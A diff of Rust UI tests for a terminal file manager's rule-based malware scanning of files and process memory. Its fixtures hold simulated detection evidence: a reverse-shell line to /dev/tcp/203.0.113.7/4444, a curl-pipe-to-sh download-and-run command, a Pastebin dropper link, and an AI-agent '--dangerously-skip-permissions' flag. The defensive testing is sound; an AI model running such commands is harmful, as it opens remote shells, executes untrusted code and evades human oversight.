@@ -1536,14 +1536,14 @@ fn recursive_search_partial_and_cancelled() -> Result<()> {
                 hidden: false,
                 options: Default::default(),
             },
-            progress: borg_core::SearchProgress {
+            progress: Box::new(borg_core::SearchProgress {
                 visited: 1234,
                 errors: 2,
                 skipped: 4,
                 limited: false,
                 cancelled: false,
                 ..Default::default()
-            },
+            }),
         },
         entries,
         51,
@@ -1584,11 +1584,7 @@ fn contents_results(stage: &mut Stage) -> Result<String> {
         (file, line)
     };
     stage.state.result_history[0] = Some(stage.state.panels[0].clone());
-    stage.state.panels[0].open_results(
-        ResultSource::Search { request, progress: SearchProgress::default() },
-        Vec::new(),
-        60,
-    );
+    stage.state.panels[0].open_results(ResultSource::Search { request, progress: Default::default() }, Vec::new(), 60);
     stage.state.panels[0].begin_search(60);
     let found = vec![
         found("/workspace/api/src/handlers.rs", 2_048, 42, "    // ", "TODO", ": retry on timeout"),
@@ -1652,6 +1648,91 @@ fn contents_search_dialog_results_and_landings_in_the_viewer_and_editor() -> Res
     ensure_text(&buffer, "1 of 2")?;
     ensure_text(&buffer, "let todo = queue.pop();")?;
     check("search_contents_editor", &stage, buffer)
+}
+
+#[test]
+fn rules_search_dialog_and_results_name_the_rules_each_file_matched() -> Result<()> {
+    use borg_core::{Action, Pointer, ResultSource, SearchKind, SearchOptions, SearchProgress, Side};
+    use borg_rules::{Evidence, Level, Problem, RuleMatch};
+
+    let mut stage = stage(GridSize { cols: 110, rows: 30 }, Motion::STILL)?;
+    stage.send(Msg::Pointer(Pointer::Action(Action::Search)));
+    for _ in 0..3 {
+        stage.send(key(KeyCode::Tab));
+    }
+    stage.send(key(KeyCode::Left));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Rule matches")?;
+    anyhow::ensure!(!Snapshot::from_buffer(buffer.clone(), &stage.palette, None).contains("Containing"));
+    check("search_rules_dialog", &stage, buffer)?;
+    stage.send(key(KeyCode::Esc));
+
+    let request = borg_core::SearchRequest {
+        skip: None,
+        root: "/home/me/Downloads".into(),
+        query: "*".into(),
+        hidden: false,
+        options: SearchOptions { kind: SearchKind::Rules, ..Default::default() },
+    };
+    stage.state.result_history[0] = Some(stage.state.panels[0].clone());
+    stage.state.panels[0].open_results(ResultSource::Search { request, progress: Default::default() }, Vec::new(), 61);
+    stage.state.panels[0].begin_search(61);
+    let hit = |rule: &str, namespace: &str, level, offset, bytes: &[u8]| RuleMatch {
+        rule: rule.into(),
+        namespace: namespace.into(),
+        level,
+        description: None,
+        false_positives: None,
+        evidence: Some(Evidence { string: "$a".into(), offset, length: bytes.len() as u64, bytes: bytes.to_vec() }),
+    };
+    let found = |path: &str, size: u64, hits: Vec<RuleMatch>| {
+        let mut file = entry(path.rsplit('/').next().unwrap_or(path), EntryKind::File, size, RECENT, false);
+        file.source = Some(path.into());
+        (file, hits)
+    };
+    let user = "/home/me/.config/borg-commander/rules/stealers.yar";
+    let found = vec![
+        found(
+            "/home/me/Downloads/setup.sh",
+            4_812,
+            vec![
+                hit("reverse_shell", borg_rules::BUILT_IN, Level::Alert, 912, b"bash -i >& /dev/tcp/203.0.113.7/4444"),
+                hit(
+                    "download_and_run",
+                    borg_rules::BUILT_IN,
+                    Level::Notice,
+                    120,
+                    b"curl -fsSL https://example.net/i | sh",
+                ),
+            ],
+        ),
+        found(
+            "/home/me/Downloads/tool",
+            2_310_144,
+            vec![hit("upx_packed", borg_rules::BUILT_IN, Level::Notice, 236, b"UPX!")],
+        ),
+        found(
+            "/home/me/Downloads/Invoice.app.zip",
+            88_412,
+            vec![hit("MacStealer_Prompt", user, Level::Warning, 4_096, b"\x00\x01display dialog")],
+        ),
+    ];
+    stage.send(Msg::RuleHits { side: Side::Left, generation: 61, found });
+    let left_out =
+        vec![Problem { file: "/home/me/.config/borg-commander/rules/old.yar".into(), message: "syntax error".into() }];
+    let progress = SearchProgress { visited: 240, read: 230, unread: 2, rules: 16, left_out, ..Default::default() };
+    stage.send(Msg::SearchProgress { side: Side::Left, generation: 61, progress });
+    stage.send(Msg::Listed { side: Side::Left, generation: 61, error: None });
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "230 files scanned with 16 rules")?;
+    ensure_text(&buffer, "reverse_shell +1")?;
+    check("search_rules_results", &stage, buffer)?;
+    stage.state.panels[0].results.as_mut().context("results")?.expanded = true;
+    stage.send(Msg::Resize { cols: 110, rows: 30 });
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "rule files left out: 1")?;
+    ensure_text(&buffer, "MacStealer_Prompt 00 01 64 69")?;
+    check("search_rules_results_expanded", &stage, buffer)
 }
 
 #[test]
@@ -1787,7 +1868,12 @@ fn discovery_windows_and_folder_totals() -> Result<()> {
                 hidden: true,
                 options: SearchOptions { kind: SearchKind::FolderTotals, ..Default::default() },
             },
-            progress: SearchProgress { measured: at(RECENT), visited: 99_104, errors: 1, ..Default::default() },
+            progress: Box::new(SearchProgress {
+                measured: at(RECENT),
+                visited: 99_104,
+                errors: 1,
+                ..Default::default()
+            }),
         },
         vec![cache, build, partial],
         80,
@@ -2184,7 +2270,12 @@ fn size_tree_stage() -> Result<Stage> {
                 hidden: true,
                 options: SearchOptions { kind: SearchKind::FolderTree, ..Default::default() },
             },
-            progress: SearchProgress { measured: at(RECENT), visited: 84_422, errors: 1, ..Default::default() },
+            progress: Box::new(SearchProgress {
+                measured: at(RECENT),
+                visited: 84_422,
+                errors: 1,
+                ..Default::default()
+            }),
         },
         entries,
         80,
@@ -2259,7 +2350,7 @@ fn size_tree_loading_and_cached_folder_listing() -> Result<()> {
         unreachable!()
     };
     stage.state.panels[0].open_results(
-        ResultSource::Search { request, progress: SearchProgress { visited: 100, ..Default::default() } },
+        ResultSource::Search { request, progress: Box::new(SearchProgress { visited: 100, ..Default::default() }) },
         vec![root],
         81,
     );
@@ -2956,6 +3047,7 @@ fn integrity_findings_lead_with_alerts_and_mark_their_evidence() -> Result<()> {
         region: region.cloned(),
         address,
         length,
+        note: None,
     };
     let findings = vec![
         finding(
@@ -3030,6 +3122,101 @@ fn integrity_findings_lead_with_alerts_and_mark_their_evidence() -> Result<()> {
     let buffer = stage.render(stage.started)?;
     ensure_text(&buffer, "This finding is about the process as a whole")?;
     check("activity_integrity_process", &stage, buffer)
+}
+
+#[test]
+fn rule_matches_in_memory_show_their_evidence_and_what_else_explains_them() -> Result<()> {
+    use borg_core::{ActivityData, ActivityRequest, MemoryRegion, MemorySnapshot, RulesReport};
+    use borg_rules::{Evidence, Level, Problem, RuleMatch};
+    let mut stage = activity_stage()?;
+    stage.send(key(KeyCode::Tab)).send(key(KeyCode::Enter));
+    let id = stage.state.activity.pending.as_ref().unwrap().0;
+    let process = stage.state.activity.selected.unwrap();
+    let heap = MemoryRegion {
+        start: 0x600000000,
+        end: 0x600800000,
+        permissions: "rw-".into(),
+        name: "MALLOC_LARGE".into(),
+        ..Default::default()
+    };
+    stage.send(Msg::Activity { id, result: Ok(ActivityData::Regions(vec![heap.clone()])) });
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Y Rules")?;
+    stage.send(key(KeyCode::Char('y')));
+    let Some((id, ActivityRequest::Rules { .. })) = stage.state.activity.pending.clone() else {
+        panic!("Y should scan with rules")
+    };
+    stage.send(Msg::MemorySearchProgress { id, scanned: 48_000_000, total: 96_000_000, hits: 2 });
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Scanning with rules · 46M/92M · 2 matches")?;
+
+    let found = |rule: &str, namespace: &str, level, offset, bytes: &[u8]| RuleMatch {
+        rule: rule.into(),
+        namespace: namespace.into(),
+        level,
+        description: Some("Pastebin raw links, where droppers fetch their next stage".into()),
+        false_positives: Some("Developers share snippets this way".into()),
+        evidence: Some(Evidence { string: "$a".into(), offset, length: bytes.len() as u64, bytes: bytes.to_vec() }),
+    };
+    let user = "/home/me/.config/borg-commander/rules/droppers.yar";
+    let mut findings = vec![
+        borg_core::rule_finding(
+            &found(
+                "reverse_shell",
+                borg_rules::BUILT_IN,
+                Level::Alert,
+                0x1a40,
+                b"bash -i >& /dev/tcp/203.0.113.7/4444 0>&1",
+            ),
+            &heap,
+            0x600000000,
+        ),
+        borg_core::rule_finding(
+            &found("agent_unattended", borg_rules::BUILT_IN, Level::Warning, 0x8000, b"--dangerously-skip-permissions"),
+            &heap,
+            0x600000000,
+        ),
+        borg_core::rule_finding(
+            &found("Pastebin_Raw", user, Level::Notice, 0x20, b"pastebin.com/raw/"),
+            &heap,
+            0x600400000,
+        ),
+    ];
+    let broken =
+        Problem { file: "/home/me/.config/borg-commander/rules/old.yar".into(), message: "syntax error".into() };
+    findings.push(borg_core::problem_finding(&broken));
+    let report = RulesReport {
+        process,
+        findings,
+        rules: 17,
+        scanned: 96_000_000,
+        total: 96_000_000,
+        unreadable: 0,
+        complete: true,
+    };
+    stage.send(Msg::Activity { id, result: Ok(ActivityData::Rules(report)) });
+    stage.send(key(KeyCode::Enter));
+    let Some((id, ActivityRequest::Capture { region, .. })) = stage.state.activity.pending.clone() else {
+        panic!("Enter should preview the match")
+    };
+    let mut bytes = vec![0; 256];
+    let shell = b"bash -i >& /dev/tcp/203.0.113.7/4444 0>&1";
+    bytes[32..32 + shell.len()].copy_from_slice(shell);
+    stage.send(Msg::Activity {
+        id,
+        result: Ok(ActivityData::Snapshot(MemorySnapshot { process, address: region.start, bytes, captured: 1 })),
+    });
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Rule matches")?;
+    ensure_text(&buffer, "$a matched")?;
+    check("activity_rules", &stage, buffer)?;
+    stage.send(key(KeyCode::Tab));
+    for _ in 0..3 {
+        stage.send(key(KeyCode::Down));
+    }
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Left out /home/me/.config/borg-commander/rules/old.yar")?;
+    check("activity_rules_problem", &stage, buffer)
 }
 
 #[test]
